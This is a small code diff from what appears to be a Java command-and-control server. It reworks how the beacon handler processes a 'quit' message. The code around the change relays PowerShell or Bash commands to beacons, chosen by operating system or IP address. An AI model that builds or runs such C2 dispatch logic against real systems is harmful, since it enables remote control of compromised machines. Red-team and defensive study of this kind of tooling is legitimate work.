@@ -95,14 +95,16 @@ public class BeaconC2Handler implements Runnable{
                 String message = C2Server.receive();
                 if(!(message.equals("KEEP_ALIVE"))){
                     System.out.println(message);
+                    if(message.equals("quit")){
+                        beaconServer.quit("C2 Server Shutting Down");
+                        authenticationSentinel = false;
+                        break;
+                    }
                     String[] tokensAndCommands = message.split("_");
                     String[] tokens = tokensAndCommands[0].split(" ");
                     String verb = tokens[0];
                     String scope = tokens[1];
                     String commands = tokensAndCommands[1];
-                    if(tokens[0].equals("quit")){
-                        break;
-                    }
                     if(verb.equals("Command")){
                         // If a message is a command, it will be in the format "Command [Scope - Windows, Linux, or IPv4 Address]_[Powershell/Bash command to be run]"
                         beaconServer.distributeCommands(scope, commands);
